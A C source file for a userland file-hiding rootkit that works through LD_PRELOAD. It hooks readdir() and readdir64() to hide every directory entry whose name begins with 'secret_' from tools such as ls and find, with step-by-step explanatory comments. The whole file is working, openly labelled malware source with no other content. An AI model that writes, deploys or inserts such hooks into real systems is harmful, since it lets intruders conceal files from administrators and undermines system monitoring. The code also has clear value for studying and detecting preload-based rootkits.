#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>

// File hiding rootkit using LD_PRELOAD
// Hides files/directories starting with HIDE_PREFIX

#define HIDE_PREFIX "secret_"

// Hook readdir() - used by ls, find, etc.
struct dirent *readdir(DIR *dirp)
{
    // Static variable persists between calls
    // NULL on first call, then holds original function pointer
    static struct dirent *(*original_readdir)(DIR *) = NULL;
    struct dirent *entry;
    
    // First time this function is called, get the real readdir
    if (!original_readdir)
    {
        // RTLD_NEXT means "find the NEXT readdir in the library chain"
        // This gets us the real libc readdir, not our hook
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }
    
    // Keep calling the real readdir until we find a file to show
    while ((entry = original_readdir(dirp)) != NULL)
    {
        // Check if this filename starts with our hide prefix
        if (strncmp(entry->d_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0)
        {
            // This file should be hidden - skip it and get next entry
            continue;
        }
        
        // This file doesn't match our hide pattern - show it
        break;
    }
    
    // Return either a valid entry or NULL (end of directory)
    return entry;
}

// Hook readdir64() - 64-bit version of readdir
// Many modern programs use this instead of readdir
struct dirent64 *readdir64(DIR *dirp)
{
    static struct dirent64 *(*original_readdir64)(DIR *) = NULL;
    struct dirent64 *entry;
    
    // Same pattern: get original function first time
    if (!original_readdir64)
    {
        original_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    }
    
    // Filter out files matching our prefix
    while ((entry = original_readdir64(dirp)) != NULL)
    {
        if (strncmp(entry->d_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0)
        {
            continue;
        }
        break;
    }
    
    return entry;
}